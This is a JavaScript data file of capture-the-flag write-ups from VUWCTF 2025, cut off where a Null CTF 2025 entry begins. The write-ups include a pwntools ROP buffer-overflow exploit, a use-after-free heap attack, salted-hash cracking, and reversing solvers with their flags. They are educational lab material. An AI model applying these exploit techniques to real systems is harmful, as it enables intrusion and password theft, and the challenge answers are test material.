const ctfData = {
    "VUWCTF 2025": {
        "rank": "26th place",
        "description": "University-level competition with emphasis on practical security challenges.",
        "challenges": [
            {
                "id": "automatoncsc",
                "title": "AutomatonCSC",
                "category": "Miscellaneous",
                "tags": [
                    "http"
                ],
                "writeup": "<p>Go to https://automatoncsc.challenges.2025.vuwctf.com/robots.txt/\nYou will find /robotnics_home_7x9k2m/\nthen just go to https://automatoncsc.challenges.2025.vuwctf.com/robotnics_home_7x9k2m/\nIn the source you will find another subdomain that leads to flag.txt\nhttps://automatoncsc.challenges.2025.vuwctf.com/robotnics_home_7x9k2m/flag.txt\nFlag: VuwCTF{We_love_you_NZCSC!!!}</p>\n"
            },
            {
                "id": "classy_people_dont_debug",
                "title": "Classy_People_Dont_Debug",
                "category": "Reverse Engineering",
                "tags": [
                    "stack",
                    "wireshark",
                    "shark"
                ],
                "writeup": "<h3>1. Initial Reconnaissance</h3>\n<p>We started with basic file analysis using <code>checksec</code>:</p>\n<p>Bash</p>\n<pre><code class=\"\">Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\n</code></pre>\n<p>Running <code>strings</code> revealed aggressive environment scanning. The binary searches for strings like <code>gdb</code>, <code>frida</code>, <code>strace</code>, <code>wireshark</code>, and <code>ida</code> in <code>/proc</code> and loaded libraries. This confirmed that running the binary would likely trigger a trap or fake execution path.</p>\n<h3>2. Static Analysis</h3>\n<p>We opened the binary in <strong>Binary Ninja</strong> to analyze the control flow.</p>\n<h4>The \"Minefield\" (Anti-Debug)</h4>\n<p>The <code>.rodata</code> section contained a list of forbidden tools (<code>0x404022</code> - <code>0x40410b</code>). The entry point logic verified the environment against these strings. If any were found, the program would likely alter its state or exit.</p>\n<h4>The Main Verification Loop</h4>\n<p>We located the main logic by tracing the \"Correct!\" string (<code>0x404437</code>). This led us to a loop in <code>main</code> that iterates <strong>33 times</strong> (length of the flag).</p>\n<p>The loop performed the following operations:</p>\n<p>1. <strong>Extraction:</strong> It extracted a byte from a large data blob at <code>0x404180</code> using a <strong>stride of 6</strong> (e.g., <code>blob[i * 6]</code>).</p>\n<p>2. <strong>Transformation:</strong> It passed the index <code>i</code> and the extracted byte to a function <code>sub_402f88</code>.</p>\n<p>3. <strong>Comparison:</strong> The result of the transformation was compared against the user's input character.</p>\n<h4>Reversing the Math (<code>sub_402f88</code>)</h4>\n<p>The transformation function <code>sub_402f88</code> was obfuscated with helper functions for basic arithmetic (<code>sub_4038c0</code> for <code>*</code>, <code>sub_403aaa</code> for <code>^</code>, etc.). By analyzing the arguments, we reconstructed the equation:</p>\n<p>Plaintext</p>\n<pre><code class=\"\">FlagChar = EncryptedByte ^ Term1 ^ Term2 ^ Term3\n</code></pre>\n<p>Where:</p>\n<ul>\n<li><code>EncryptedByte</code> = <code>blob[i * 6]</code></li>\n<li><code>Term1</code> = <code>(i * 13) + 193</code></li>\n<li><code>Term2</code> = <code>(i * 5) + 163</code></li>\n<li><code>Term3</code> = <code>SBox[i % 64]</code> (Looked up from a secondary blob at <code>0x404120</code>)</li>\n</ul>\n<h3>3. The Solution</h3>\n<p>Since the logic was deterministic and relied only on the index <code>i</code> and hardcoded data blobs, we wrote a Python script to emulate the verification function and generate the flag.</p>\n<p><strong>Solver Script:</strong></p>\n<p>Python</p>\n<pre><code class=\"\">&lt;h2&gt;VuwCTF 'Classy' Solver&lt;/h2&gt;\n<p>&lt;h2&gt;1. The S-Box (Data at 0x404120)&lt;/h2&gt;\nsbox = [\n    0x10, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x90, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xfa, 0x0f,\n    0x11, 0x21, 0x31, 0x41, 0x51, 0x61, 0x71, 0x81, 0x92, 0xa2, 0xb2, 0xc2, 0xd2, 0xe2, 0xf2, 0x02,\n    0x13, 0x23, 0x33, 0x43, 0x53, 0x63, 0x73, 0x83, 0x94, 0xa4, 0xb4, 0xc4, 0xd4, 0xe4, 0xf4, 0x04,\n    0x15, 0x25, 0x35, 0x45, 0x55, 0x65, 0x75, 0x85, 0x96, 0xa6, 0xb6, 0xc6, 0xd6, 0xe6, 0xf6, 0x06\n]</p>\n<p>&lt;h2&gt;2. The Encrypted Blob (Data at 0x404180)&lt;/h2&gt;\nencrypted_blob = bytes([\n    0x24, 0x41, 0x44, 0x64, 0x45, 0x5b, 0x31, 0x56, 0x22, 0x69, 0x5d, 0x58, \n    0x32, 0x16, 0x7f, 0x5d, 0x5e, 0x90, 0x5d, 0x0b, 0x5c, 0x58, 0x54, 0x71, \n    0x43, 0x5a, 0xba, 0x5b, 0x66, 0x58, 0x9e, 0xbc, 0x4c, 0x58, 0x5a, 0x6b, \n    0xc2, 0x52, 0x5b, 0x6f, 0x79, 0x03, 0x24, 0x63, 0x5f, 0x69, 0x03, 0x19, \n    0x17, 0x4d, 0x6b, 0x1d, 0x6f, 0xa5, 0x3f, 0x58, 0x6c, 0x60, 0x44, 0xa2, \n    0x53, 0x64, 0x60, 0x44, 0xa2, 0x62, 0x18, 0x6d, 0x43, 0x67, 0x61, 0x76, \n    0x3f, 0x61, 0x65, 0x7f, 0x60, 0xb3, 0x0d, 0x66, 0x8e, 0x6f, 0xb2, 0xa1, \n    0x05, 0x84, 0x69, 0xa4, 0xb3, 0xfe, 0x16, 0x61, 0xb4, 0xa3, 0xfe, 0xd5,\n    0x00, 0x45, 0xa4, 0xf7, 0xe6, 0xf9, 0x3e, 0x94, 0xe7, 0xfe, 0xf9, 0x98, \n    0x38, 0xfa, 0xf9, 0xbc, 0x9b, 0x7e, 0x9f, 0xe1, 0xbc, 0x9b, 0x7e, 0x76,\n    0xa3, 0xbe, 0xbd, 0x70, 0x44, 0x71, 0x98, 0xbf, 0x42, 0x5a, 0x77, 0x00, \n    0xd1, 0x79, 0x5b, 0x60, 0x71, 0x8e, 0x0f, 0x41, 0x76, 0x87, 0x8c, 0x95, \n    0x2f, 0x86, 0x87, 0xf4, 0x85, 0xaa, 0xb2, 0x95, 0xe2, 0x8b, 0x88, 0x89, \n    0xeb, 0xea, 0xcb, 0x88, 0x89, 0x6e, 0xbd, 0xc3, 0x88, 0x89, 0x6e, 0x36,\n    0x8f, 0xed, 0x8e, 0x13, 0x05, 0x10, 0x9f, 0x8e, 0x03, 0x0d, 0x10, 0x03,\n    0xbf, 0x09, 0x0b, 0x26, 0x31, 0x5c, 0x5b, 0x03, 0x16, 0x01, 0x5c, 0x57,\n    0x4c, 0x05, 0x04, 0x53, 0x42, 0x99\n])</p>\n<p>flag = \"\"</p>\n<p>for i in range(33):\n    enc_byte = encrypted_blob[i * 6]\n    term1 = (i * 13) + 193\n    term2 = (i * 5) + 163\n    term3 = sbox[i % 64]</p>\n<p># Decrypt\n    decrypted_char = (enc_byte ^ term1 ^ term2 ^ term3) &amp; 0xFF\n    flag += chr(decrypted_char)</p>\n<p>print(f\"Flag: {flag}\")\n</code></pre></p>\n<h3>4. Flag</h3>\n<p><code>VuwCTF{very_classy_d0'nt_6ou_s33}</code></p>\n"
            },
            {
                "id": "delicious-cooking",
                "title": "Delicious Cooking",
                "category": "Cryptography",
                "tags": [
                    "crack"
                ],
                "writeup": "<h4><strong>1. Reconnaissance</strong></h4>\n<p>First, we searched the provided database dump for the target username, <code>meatballfan19274</code>.</p>\n<ul>\n<li><strong>User:</strong> <code>meatballfan19274</code></li>\n<li><strong>Hash:</strong> <code>09be2259e0224f41b96b633b73e7138b50b4be0a1ae20c0eb6a7434e8fc47303</code></li>\n<li><strong>Salt:</strong> <code>334aa758c52bb2f862f1607ff098e954</code></li>\n<li><strong>Security Hint:</strong> \"I refuse to use security questions for security reasons\"</li>\n</ul>\nThe security hint for this specific user was unhelpful. However, because this is a database dump, we can look for patterns across other users.\n<h4><strong>2. Pattern Analysis (The \"Shared Hash\" Vulnerability)</strong></h4>\n<p>We searched for other users in the database who had the <strong>exact same password hash</strong> (<code>09be...</code>) and <strong>salt</strong> (<code>334aa...</code>). If the hash and salt are identical, the password must be identical.</p>\n<p>We found several users sharing this hash, which gave us new security hints to analyze:</p>\n<p>1. <strong><code>steaksaucer28087</code>:</strong> \"Anyone can cook\"</p>\n<ul>\n<li><strong><code>icecreammaniac54990</code>:</strong> \"Anyone can cook\"</li>\n<li><strong><code>sodageek66653</code>:</strong> \"Anyone can cook\"</li>\n<li><strong><code>lasangelover47954</code>:</strong> <strong>\"fav movie + bank pin\"</strong></li>\n</ul>\n<h4><strong>3. Deduction</strong></h4>\n<p>The hints provided the pieces needed to construct the password:</p>\n<ul>\n<li><strong>\"fav movie\":</strong> The phrase \"Anyone can cook\" is the famous motto from the Pixar movie <strong>_Ratatouille_</strong>. Other users in the database also used quotes from this movie (e.g., \"Change is nature, dad\" and \"One can get too familiar with vegetables, you know\" ).</li>\n<li><strong>\"bank pin\":</strong> This implies a 4-digit number appended to the movie title.</li>\n</ul>\n<strong>Hypothesis:</strong> The password is likely <code>ratatouille</code> followed by 4 digits (e.g., <code>ratatouille0000</code> to <code>ratatouille9999</code>).\n<h4><strong>4. Exploit (Cracking the Hash)</strong></h4>\n<p>We performed a targeted brute-force attack using the derived pattern.</p>\n<ul>\n<li><strong>Attack Mode:</strong> Dictionary/Mask Attack</li>\n<li><strong>Candidates:</strong> <code>ratatouille0000</code> - <code>ratatouille9999</code></li>\n<li><strong>Salt Interpretation:</strong> The 32-character salt was hex-encoded. It needed to be decoded into raw bytes before hashing.</li>\n<li><strong>Hash Algo:</strong> SHA-256 (Mode 1410: <code>sha256($pass.$salt)</code>)</li>\n</ul>\n<strong>The Winning Combination:</strong>\n<ul>\n<li><strong>Candidate:</strong> <code>ratatouille6281</code></li>\n<li><strong>Salt (Hex-decoded):</strong> <code>0x334aa758c52bb2f862f1607ff098e954</code></li>\n</ul>\n<h4><strong>5. Flag</strong></h4>\n<p>The password for <code>meatballfan19274</code> is:</p>\n<p><strong><code>ratatouille6281</code></strong></p>\n"
            },
            {
                "id": "fortune-cookies",
                "title": "Fortune-Cookies",
                "category": "Miscellaneous",
                "tags": [
                    "http",
                    "cookie",
                    "crack"
                ],
                "writeup": "<h4>Challenge Description</h4>\n<p>> \"I'm really craving that fortune cookie feeling when you crack one open and read a message of 512 octets or fewer. I always need the best fortune, so I end up eating dozens of sugar-filled cookies at a time. Can you help?\"\n> \n> <strong>Connect:</strong> <code>nc fortune-cookie.challenges.2025.vuwctf.com 17</code></p>\n<h4>Reconnaissance & Analysis</h4>\n<p>The challenge provides a hostname and a specific port: <strong>17</strong>.</p>\n<p>1. <strong>Port Analysis:</strong> A quick check of standard ports reveals that TCP/UDP Port 17 is reserved for the <strong>Quote of the Day (QOTD)</strong> protocol (defined in <a href=\"https://tools.ietf.org/html/rfc865\" target=\"_blank\">RFC 865</a>).</p>\n<p>2. <strong>Protocol Behavior:</strong> The QOTD protocol is very simple: when a client connects, the server sends a short message (limited to 512 characters/octets) and immediately closes the connection.</p>\n<p>3. <strong>The Clue:</strong> The description mentions \"eating dozens\" of cookies to find the \"best fortune.\" This suggests that the server pulls from a randomized list of quotes, and the flag is simply one rare entry in that list.</p>\n<h4>Solution</h4>\n<p>To get the flag, we don't need to exploit a vulnerability. We simply need to automate \"eating\" the cookies (connecting repeatedly) until the flag is served.</p>\n<p>We can achieve this with a simple Bash one-liner that loops the <code>netcat</code> connection and <code>greps</code> for the flag format.</p>\n<p><strong>Exploit Script (Bash):</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">while true; do \n    nc fortune-cookie.challenges.2025.vuwctf.com 17 | grep \"VuwCTF{\" &amp;&amp; break\ndone\n</code></pre>\n<p><strong>Execution:</strong> The script loops infinitely. Most connections return a standard fortune cookie quote and are ignored by <code>grep</code>. Eventually, the server returns the flag, <code>grep</code> prints it to the console, and the loop breaks.</p>\n<h4>The Flag</h4>\n<p>Plaintext</p>\n<pre><code class=\"\">VuwCTF{om_nom_nom_bytes}\n</code></pre>\n"
            },
            {
                "id": "fruit-ninja",
                "title": "Fruit Ninja",
                "category": "Binary Exploitation",
                "tags": [
                    "heap",
                    "memory"
                ],
                "writeup": "<h3>1. Vulnerability Analysis</h3>\n<p>By analyzing the binary with GDB, we discovered two critical flaws:</p>\n<p>1. <strong>Dangling Pointer (UAF):</strong> When selecting <strong>Option 2 (Throw away fruit)</strong>, the program frees the memory chunk but fails to clear the pointer in the <code>fruit_basket</code> array. This allows us to access and edit \"freed\" memory.</p>\n<p>2. <strong>Heap Reuse:</strong> The <strong>Option 6 (Reset leaderboard)</strong> function allocates a new memory chunk of size <code>0x24</code> (padded to <code>0x30</code>). This is the exact same size as a \"Fruit\" chunk. Because the heap manager (glibc allocator) prioritizes recycling recently freed chunks (via the <code>tcache</code>), resetting the leaderboard will reuse the memory address of the most recently freed fruit.</p>\n<p><strong>The Win Condition:</strong> The function <code>perform_special_action</code> (Option 5) checks if the data inside the <code>leaderboard</code> matches the string <strong>\"Admin\"</strong>.</p>\n<h3>2. The Exploit Strategy</h3>\n<p>We can trick the program into making the <code>leaderboard</code> and our <code>fruit_basket</code> point to the <strong>same memory address</strong>. This allows us to use the \"Edit Fruit\" feature to overwrite the <code>leaderboard</code> data with \"Admin\".</p>\n<h3>3. Manual Execution Steps</h3>\n<p>Here is the exact sequence of inputs to solve the challenge manually (works on both local binary and remote server).</p>\n<h4>Step 1: Slice a Fruit (Allocation)</h4>\n<p>We create a fruit to reserve a chunk of memory on the heap.</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>1</code></li>\n<li><strong>Fruit Name:</strong> <code>Trash</code> (Any name works here)</li>\n<li><strong>Points:</strong> <code>1</code></li>\n</ul>\n<h4>Step 2: Throw Away Fruit (Free)</h4>\n<p>We free the fruit we just created. The memory is released to the \"recycle bin,\" but our pointer to it (Index 0) remains active (dangling).</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>2</code></li>\n<li><strong>Index:</strong> <code>0</code></li>\n</ul>\n<h4>Step 3: Reset Leaderboard (Aliasing)</h4>\n<p>We choose to reset the leaderboard. The program requests memory. The allocator notices the chunk we just freed in Step 2 fits perfectly, so it gives that specific memory address to the <code>leaderboard</code>.</p>\n<ul>\n<li><strong>Crucial State:</strong> <code>fruit_basket[0]</code> and <code>leaderboard</code> now point to the <strong>same address</strong>.</li>\n<li><strong>Menu Choice:</strong> <code>6</code></li>\n</ul>\n<h4>Step 4: Overwrite Data</h4>\n<p>We use the \"Edit\" feature on the dangling fruit pointer. Since it points to the same place as the leaderboard, we are actually editing the leaderboard.</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>4</code></li>\n<li><strong>Index:</strong> <code>0</code></li>\n<li><strong>New Name:</strong> <code>Admin</code></li>\n<li>_Note: This must be exact. Case-sensitive._</li>\n</ul>\n<h4>Step 5: Trigger Victory</h4>\n<p>Now that the leaderboard contains the string \"Admin\", we run the check.</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>5</code></li>\n</ul>\n<strong>Output:</strong>\n<p>Plaintext</p>\n<pre><code class=\"\">Admin Welcome!\nFlag: VuwCTF{fr33_th3_h34p_sl1c3_th3_fr00t}\n</code></pre>\n<h3>Summary</h3>\n<p>This challenge is a textbook example of <strong>Heap Aliasing</strong>. By understanding that <code>malloc</code> recycles memory and that the program didn't clean up its pointers (<code>fruit_basket[0]</code>), we were able to control an internal program structure (<code>leaderboard</code>) using user-accessible controls (<code>edit_fruit</code>).</p>\n"
            },
            {
                "id": "missing-function",
                "title": "Missing Function",
                "category": "Reverse Engineering",
                "tags": [
                    "xor",
                    "shellcode",
                    "stack",
                    "assembly",
                    "ghidra",
                    "memory"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We are given a binary (<code>flag_verifier</code>) that asks for a flag input. Static analysis reveals that the validation logic is not present in the <code>.text</code> section. Instead, the program allocates executable memory, copies a blob of data into it, and executes that data as a function.</p>\n<h3>Step 1: Static Analysis</h3>\n<p>Opening the binary in a decompiler (Ghidra/Binary Ninja/IDA) reveals the following control flow in <code>main</code>:</p>\n<p>1. User input is read via <code>getline</code>.</p>\n<p>2. <code>mmap</code> is called to allocate a memory region with permissions <code>7</code> (<strong>RWX</strong> - Read, Write, Execute).</p>\n<p>3. <code>memcpy</code> moves a chunk of bytes from a global data section (<code>0x404020</code>) into this new memory.</p>\n<p>4. The program casts the allocated memory address to a function pointer and calls it: <code>rax_2(input_string, input_length)</code>.</p>\n<p>This confirms the binary is a <strong>Shellcode Runner</strong>. To solve it, we must analyze the code generated at runtime.</p>\n<h3>Step 2: Dynamic Analysis (Bypassing PIE)</h3>\n<p>Running <code>checksec</code> reveals that <strong>PIE (Position Independent Executable)</strong> is enabled, meaning memory addresses are randomized at every run. We cannot simply break at the static offset.</p>\n<p><strong>Strategy:</strong></p>\n<p>1. Run the program in GDB and let it load.</p>\n<p>2. Interrupt execution while it waits for input.</p>\n<p>3. Find the base address and calculate the offset to the shellcode invocation.</p>\n<p><strong>GDB Steps:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">gdb ./flag_verifier\n(gdb) start\n(gdb) continue\n&lt;h2&gt;Program waits for input... Press Ctrl+C&lt;/h2&gt;\n^C\n(gdb) info proc mappings\n</code></pre>\n<p>_We identified the Base Address (e.g., <code>0x555555554000</code>)._</p>\n<p>We located the <code>call</code> instruction at offset <code>0x134c</code>. <strong>Breakpoint Address:</strong> <code>Base Address + 0x134c</code>.</p>\n<h3>Step 3: Analyzing the Shellcode</h3>\n<p>After setting the breakpoint and providing dummy input (<code>AAAA</code>), we stepped (<code>si</code>) into the mapped memory.</p>\n<p>Disassembling the shellcode (<code>x/20i $pc</code>) revealed the following logic:</p>\n<h4>1. Length Check</h4>\n<p>Code snippet</p>\n<pre><code class=\"\">cmpl   $0x1d,-0x4c(%rbp)  ; 0x1d = 29 decimal\nje     ...\n</code></pre>\n<p>The flag must be exactly <strong>29 characters</strong> long.</p>\n<h4>2. Data Loading</h4>\n<p>The code loads several 64-bit integers onto the stack using <code>movabs</code>. These represent the encrypted flag bytes in <strong>Little Endian</strong>.</p>\n<ul>\n<li><code>0x9ff8e6a5c0d784d5</code></li>\n<li><code>0xecc29cfad3aeedcf</code></li>\n<li>...and others.</li>\n</ul>\n<h4>3. Key Loading</h4>\n<p>The code initializes a rolling XOR key:</p>\n<p>Code snippet</p>\n<pre><code class=\"\">movw   $0xf183,-0x33(%rbp)  ; Stores bytes 0x83, 0xF1\nmovb   $0xa0,-0x31(%rbp)    ; Stores byte  0xA0\n</code></pre>\n<p>Key: <code>[0x83, 0xF1, 0xA0]</code></p>\n<h4>4. Decryption Loop</h4>\n<p>The loop logic was identified as:</p>\n<p>1. Load encrypted byte.</p>\n<p>2. Load key byte (cycling through the 3-byte key).</p>\n<p>3. XOR them (<code>encrypted ^ key</code>).</p>\n<p>4. Compare result with user input.</p>\n<h3>Step 4: Solving</h3>\n<p>We extracted the encrypted bytes and the key from the assembly and wrote a Python script to replicate the XOR decryption.</p>\n<p><strong>Solution Script:</strong></p>\n<p>Python</p>\n<pre><code class=\"\">#!/usr/bin/env python3\n<p>&lt;h2&gt;Key extracted from assembly (Little Endian: 0xf183 -&gt; 83 f1)&lt;/h2&gt;\n&lt;h2&gt;Key sequence: 83 F1 A0&lt;/h2&gt;\nkey = [0x83, 0xF1, 0xA0]</p>\n<p>&lt;h2&gt;Encrypted chunks extracted from 'movabs' instructions&lt;/h2&gt;\n&lt;h2&gt;We convert them to bytes (Little Endian)&lt;/h2&gt;\nchunks = [\n    0x9ff8e6a5c0d784d5,\n    0xecc29cfad3aeedcf,\n    0xc6aee0c99decc29c, # Note: This chunk overlapped in memory, \n    0x8cedcf98f7c39ff6  # but we reconstruct the stream based on offsets\n]</p>\n<p>&lt;h2&gt;Reconstructing the raw byte stream&lt;/h2&gt;\ndata = bytearray()\ndata.extend(chunks[0].to_bytes(8, 'little'))\ndata.extend(chunks[1].to_bytes(8, 'little')[:5]) # Take first 5 bytes to reach next offset\ndata.extend(chunks[2].to_bytes(8, 'little'))\ndata.extend(chunks[3].to_bytes(8, 'little'))</p>\n<p>&lt;h2&gt;Decrypt&lt;/h2&gt;\nflag = \"\"\nfor i in range(29): # We know length is 29\n    decrypted_char = data[i] ^ key[i % 3]\n    flag += chr(decrypted_char)</p>\n<p>print(f\"Flag: {flag}\")\n</code></pre></p>\n<h3>Flag</h3>\n<p><code>VuwCTF{non_symbolic_function}</code></p>\n"
            },
            {
                "id": "tokaido",
                "title": "Tokaido",
                "category": "Binary Exploitation",
                "tags": [
                    "pwn",
                    "buffer",
                    "overflow",
                    "rop",
                    "stack",
                    "memory"
                ],
                "writeup": "<h3>1. Analysis</h3>\n<p>We are provided with a 64-bit ELF binary <code>tokaido</code> and its source code <code>tokaido.c</code>.</p>\n<h4>Source Code Review</h4>\n<p>The <code>main</code> function contains two critical elements:</p>\n<p>1. <strong>Memory Leak:</strong> It prints the address of the <code>main</code> function itself (<code>printf(\"funny number: %p\\n\", main);</code>). This allows us to bypass ASLR/PIE protections.</p>\n<ul>\n<li><strong>Buffer Overflow:</strong> It uses <code>gets(buffer)</code> to read into a 16-byte buffer. Since <code>gets</code> does not check input length, we can overwrite the stack.</li>\n</ul>\nThe <code>win</code> function has a specific logic gate:\n<p>C</p>\n<pre><code class=\"\">void win() {\n    puts(\"you win\");\n    if (attempts++ &gt; 0){\n        // prints flag...\n    } else {\n        puts(\"not attempted\");\n    }\n}\n</code></pre>\n<p>The flag is only printed if <code>attempts > 0</code>. Since <code>attempts</code> starts at 0, calling <code>win()</code> once is insufficient. We must execute <code>win()</code> <strong>twice</strong> within the same exploit chain.</p>\n<h3>2. Exploitation Strategy</h3>\n<p>To exploit this, we use a <strong>Return-Oriented Programming (ROP)</strong> approach:</p>\n<p>1. <strong>Calculate Offsets:</strong> We determine the static distance between <code>main</code> and <code>win</code> in the binary.</p>\n<ul>\n<li>Static <code>main</code>: <code>0x12ce</code></li>\n<li>Static <code>win</code>: <code>0x1229</code></li>\n</ul>\n2. <strong>Bypass ASLR:</strong> Capture the \"funny number\" leak at runtime, calculate the binary's base address, and determine the dynamic address of <code>win</code>.\n<p>3. <strong>Construct Payload:</strong></p>\n<ul>\n<li><strong>Padding:</strong> 16 bytes (Buffer) + 8 bytes (Saved RBP) = <strong>24 bytes</strong>.</li>\n<li><strong>Return Address 1:</strong> Address of <code>win</code> (Increments <code>attempts</code> to 1).</li>\n<li><strong>Return Address 2:</strong> Address of <code>win</code> (Checks <code>attempts > 0</code> and prints flag).</li>\n</ul>\n<h3>3. Exploit Script</h3>\n<p>Here is the final python script using <code>pwntools</code> to solve the challenge remotely.</p>\n<p>Python</p>\n<pre><code class=\"\">from pwn import *\n<p>&lt;h2&gt;Context setup&lt;/h2&gt;\nexe = './tokaido'\nelf = ELF(exe)\ncontext.binary = elf</p>\n<p>&lt;h2&gt;Connect to server&lt;/h2&gt;\n&lt;h2&gt;r = process(exe) # For local testing&lt;/h2&gt;\nr = remote(\"tokaido.challenges.2025.vuwctf.com\", 9983)</p>\n<p>&lt;h2&gt;1. Parse the Leak&lt;/h2&gt;\nr.recvuntil(b\"funny number: \")\nleak = int(r.recvline().strip(), 16)\nlog.info(f\"Leaked main: {hex(leak)}\")</p>\n<p>&lt;h2&gt;2. Calculate Base Address&lt;/h2&gt;\n&lt;h2&gt;Formula: Base = Leak - Static_Main_Offset&lt;/h2&gt;\nelf.address = leak - elf.symbols['main']\nlog.success(f\"Calculated Binary Base: {hex(elf.address)}\")</p>\n<p>&lt;h2&gt;3. Construct Payload&lt;/h2&gt;\n&lt;h2&gt;We need to call win() TWICE.&lt;/h2&gt;\n&lt;h2&gt;Layout: [Padding 24B] + [Address of Win] + [Address of Win]&lt;/h2&gt;\npayload = b\"A\" * 24\npayload += p64(elf.symbols['win']) # First call: attempts -&gt; 1\npayload += p64(elf.symbols['win']) # Second call: prints flag</p>\n<p>&lt;h2&gt;4. Send &amp; Win&lt;/h2&gt;\nr.sendline(payload)\nr.interactive()\n</code></pre></p>\n<h3>4. Flag</h3>\n<p><code>VuwCTF{eastern_sea_route}</code></p>\n"
            },
            {
                "id": "ng\u0101wari-vm",
                "title": "ng\u0101wari-vm",
                "category": "Reverse Engineering",
                "tags": [
                    "overflow",
                    "stack",
                    "reverse",
                    "assembly"
                ],
                "writeup": "<h3>1. Initial Analysis</h3>\n<p>We start by inspecting the provided files. <code>ngawari_vm</code> is the executable, and <code>flag_checker.txt</code> contains unintelligible text data.</p>\n<p>Running <code>strings</code> on the binary reveals that it is a \"generalized, programmable input checker\". Key strings include:</p>\n<ul>\n<li><code>Ngawari VM - A generalized, programmable input checker</code></li>\n<li><code>Required first line of file missing</code></li>\n<li><code>Input accepted!</code></li>\n<li><code>Stack overflow</code> / <code>Stack underflow</code></li>\n</ul>\nThis suggests the binary implements a stack-based virtual machine that reads <code>flag_checker.txt</code> as a set of rules.\n<h3>2. Reverse Engineering the VM logic</h3>\n<p>Using <code>gdb</code> (GNU Debugger), we analyzed the <code>accept_input</code> function, which is the core execution loop. The disassembly revealed that the VM operates as a <strong>Pushdown Automaton (PDA)</strong>.</p>\n<p>A PDA is a theoretical machine that uses a <strong>Stack</strong> and a <strong>State</strong> to decide valid transitions. The disassembly showed that for every input character, the VM performs the following check:</p>\n<p>\u03b4(CurrentState,InputChar,PopStack)\u2192(NextState,PushString)</p>\n<p>Specifically, the VM reads instructions from <code>flag_checker.txt</code> and looks for a line that matches:</p>\n<p>1. <strong>Current State:</strong> The VM's current state byte.</p>\n<p>2. <strong>Input Character:</strong> The character you just typed.</p>\n<p>3. <strong>Stack Top:</strong> The character popped from the top of the stack.</p>\n<p>If a match is found, the VM transitions to the <strong>Next State</strong> and pushes a defined string onto the stack.</p>\n<h3>3. Decoding <code>flag_checker.txt</code></h3>\n<p>With the logic understood, we can parse <code>flag_checker.txt</code>.</p>\n<h4>The Header</h4>\n<p>The first line of the file is <code>aBw</code>.</p>\n<ul>\n<li><code>a</code>: <strong>Initial State</strong>.</li>\n<li><code>B</code>: <strong>Initial Stack Symbol</strong> (The stack starts with this char).</li>\n<li><code>w</code>: <strong>Accepting State</strong> (The state we must reach to win).</li>\n</ul>\n<h4>The Instructions</h4>\n<p>Subsequent lines follow a specific format. Take the line <code>i_GoPHER</code> as an example:</p>\n<ul>\n<li><code>i</code>: <strong>Current State</strong> required.</li>\n<li><code>_</code>: <strong>Input Character</strong> required.</li>\n<li><code>G</code>: <strong>Stack Pop</strong> required (Must be at the top of the stack).</li>\n<li><code>o</code>: <strong>Next State</strong>.</li>\n<li><code>PHER</code>: <strong>String to Push</strong>.</li>\n<li>_Note:_ The VM loops through this string and pushes characters. Effectively, the first character of the string (<code>P</code>) becomes the new top of the stack.</li>\n</ul>\n<h3>4. Solving the Automaton</h3>\n<p>The complexity of the stack operations makes manual solving impossible. We need to find a path from the start state <code>a</code> (with stack <code>['B']</code>) to the target state <code>w</code>.</p>\n<p>We can solve this using a Breadth-First Search (BFS) algorithm in Python. The script simulates the PDA, tracking the <code>(State, Stack)</code> tuple to find the correct path.</p>\n<h4>The Solver Script</h4>\n<p>Python</p>\n<pre><code class=\"\">import collections\n<p>def solve_vm():\n    # Load the bytecode\n    with open('flag_checker.txt', 'r') as f:\n        lines = [l.strip() for l in f.readlines() if l.strip()]</p>\n<p># Parse Header: aBw\n    # Init State: 'a', Init Stack: 'B', Target State: 'w'\n    header = lines[0]\n    init_state = header[0]\n    init_stack = (header[1],) # Represent stack as a tuple\n    target_state = header[2]</p>\n<p># Parse Transitions\n    transitions = []\n    for line in lines[1:]:\n        if len(line) &lt; 4: continue\n        # Format: [State][Input][Pop][NextState][PushStr...]\n        transitions.append({\n            'state': line[0],\n            'in_char': line[1],\n            'pop_char': line[2],\n            'next_state': line[3],\n            'push_str': line[4:] \n        })</p>\n<p># BFS Initialization\n    # Queue stores: (Current State, Current Stack Tuple, Path Taken)\n    queue = collections.deque([(init_state, init_stack, \"\")])\n    visited = set([(init_state, init_stack)])</p>\n<p>print(\"Searching for flag...\")</p>\n<p>while queue:\n        curr_state, curr_stack, history = queue.popleft()</p>\n<p># The stack cannot be empty for a valid move\n        if not curr_stack:\n            continue</p>\n<p># Get the top of the stack\n        top_of_stack = curr_stack[-1]\n        stack_body = curr_stack[:-1]</p>\n<p>for t in transitions:\n            # Check if this transition applies\n            if t['state'] == curr_state and t['pop_char'] == top_of_stack:</p>\n<p># Check for Win Condition\n                # The VM terminates input with a '^' char. \n                if t['in_char'] == '^':\n                    if t['next_state'] == target_state:\n                        return history # Return the path (the flag)\n                    continue</p>\n<p># Execute the move\n                # 1. Pop is already done (we separated top_of_stack)\n                # 2. Push the new string (reversed so first char is new top)\n                new_push = tuple(t['push_str'][::-1])\n                new_stack = stack_body + new_push\n                new_state = t['next_state']</p>\n<p># Add to queue if not visited\n                state_signature = (new_state, new_stack)\n                if state_signature not in visited:\n                    visited.add(state_signature)\n                    # Append the input char to our history\n                    queue.append((new_state, new_stack, history + t['in_char']))</p>\n<p>return \"Flag not found.\"</p>\n<p>print(f\"Flag: {solve_vm()}\")\n</code></pre></p>\n<h3>5. The Result</h3>\n<p>Running the solver simulates the machine steps and recovers the input string that satisfies the \"Accepting State\" condition.</p>\n<p><strong>Flag:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">VuwCTF{VuwCTF_1s_s0_c00l_innit}\n</code></pre>\n"
            }
        ]
    },
    "Null CTF 2025": {
        "rank": "62nd place",
        "description": "Community-driven CTF with focus on real-world security scenarios.",
        "challenges": [
            {
                "id": "biglez",
                "title": "BigLez",
                "category": "Reverse Engineering",
                "tags": [
                    "crypto",
                    "aes",
                    "xor",
                    "buffer",
                    "stack",
                    "reverse",
                    "assembly",
